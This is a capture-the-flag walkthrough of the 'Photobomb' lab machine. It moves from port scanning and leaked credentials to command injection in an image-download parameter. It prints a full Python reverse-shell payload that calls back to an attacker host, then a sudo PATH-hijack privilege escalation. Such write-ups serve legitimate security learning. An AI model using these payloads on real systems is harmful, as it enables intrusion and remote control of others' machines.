# Photobomb, Difficulty: Easy
## Author : Arkoov

# Walkthrough (User):
1. This machine only gives us the ip of the machine, so we can start by listing the open ports using nmap
> command

```sh
nmap -sT -p- -A 10.10.11.182
```

> result
![image](https://user-images.githubusercontent.com/86551419/211705866-384eafa4-50c5-44fa-9221-9cb08acd85d7.png)

2. There are two open ports which is ssh port and nginx port. after trying to access port 80 we got error not found in the web and a domain. 
after registering the domain name into /etc/hosts we finally can access the web server.

> result

![image](https://user-images.githubusercontent.com/86551419/211706132-216cd082-de03-40f3-9046-b0f5eed6f1a5.png)

3. Its a web page with a clickable link `To get started, please click here! (the credentials are in your welcome pack).` 
and after clicking it the server prompts us to insert username and password. after searching around the web, at the page source
we have a javascript file that we can access named `photobomb.js`. inside it we found the credential to login

> result
![image](https://user-images.githubusercontent.com/86551419/211708119-b526c092-5ba0-457c-986b-0e141e6a6d1f.png)

![image](https://user-images.githubusercontent.com/86551419/211708163-5a90b2a1-1fda-4a15-bf54-61ba4d83cf2c.png)

> creds
```sh
Username: pH0t0
Password: b0Mb!
```
4. After trying to login using the credential above we are redirected to a page where we can download the image with specified parameter
such as photo, filetype and dimensions

> result

![image](https://user-images.githubusercontent.com/86551419/211708561-3178b3fb-3da6-4e1b-874d-7b4005824429.png)

![image](https://user-images.githubusercontent.com/86551419/211708507-6c795130-2d6d-46f6-9233-5ae2bf87e2bc.png)

5. After trying to tamper the parameter, we found that parameter filetype is vulnerable to command injection while photo and dimensions aren't(tried
the vulnerability using wget and hosting a python http server)

> fail
![image](https://user-images.githubusercontent.com/86551419/211709157-da17506b-e189-498e-a820-81ec6bfdf381.png)

![image](https://user-images.githubusercontent.com/86551419/211709349-25bbd579-eabe-44e8-a861-706911a31f58.png)

> success

![image](https://user-images.githubusercontent.com/86551419/211709559-70855988-95f5-41b2-a1db-8bb039bc8233.png)

![image](https://user-images.githubusercontent.com/86551419/211709594-ba70d00b-7951-4daf-9716-73277fab3ea4.png)

6. Then we can try to use reverse shell payloads inside the parameter. Out of the payloads tried, `python reverse shell` payload returns the shell
back to the listener. Payload reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

> payload
```sh
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png%3bexport+RHOST%3d"10.10.16.8"%3bexport+RPORT%3d4444%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'&dimensions=1000x1500
```
> result

![image](https://user-images.githubusercontent.com/86551419/211713489-2d1808db-771f-4890-92cb-67e92507d262.png)

![image](https://user-images.githubusercontent.com/86551419/211713490-b5d5fc3d-9bb4-48e0-9b4b-4d6f5d68142a.png)

![image](https://user-images.githubusercontent.com/86551419/211713488-7129956d-e586-4654-87f0-2aeca6a07de6.png)

7. And with the shell we can open user.txt inside /home/wizard directory

# Walkthrough (Root):

1. We got the developer user and now we can try to find more clue to get root access. Using command `sudo -l` we see that there's a file `/opt/cleanup.sh` that can be executed by user wizard with root privilege. 

> result

![image](https://user-images.githubusercontent.com/86551419/211978899-687ed383-348d-4802-bcf6-e9e782a61d01.png)

2. After reading the content of the file, we can manipulate the variable path to execute the bash file. we can use the cd command and create a file using `echo "/bin/bash" > cd`. after that we can start to run `cleanup.sh` file using the variable path of our `cd` file.

> command
```sh
echo "/bin/bash" > cd
chmod +x cd
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```
> result

![image](https://user-images.githubusercontent.com/86551419/211979893-f5640080-314a-4db2-82d1-2ab97da40f21.png)

3. with the root found, we have successfully pwned the Photobomb machine.










